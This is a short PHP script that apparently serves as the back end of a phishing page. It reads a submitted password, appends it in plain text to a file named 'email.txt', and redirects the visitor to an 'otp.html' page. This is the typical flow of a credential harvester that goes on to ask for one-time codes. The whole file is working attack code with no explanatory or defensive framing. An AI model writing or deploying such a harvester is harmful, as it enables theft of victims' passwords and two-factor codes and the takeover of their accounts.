<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = trim($_POST['password']);

    if (!empty($password)) {
        $file = fopen("email.txt", "a");
        fwrite($file, "Password: " . $password . "\n");
        fclose($file);
    }

    // Redirect to OTP page
    header("Location: otp.html");
    exit();
}
?>
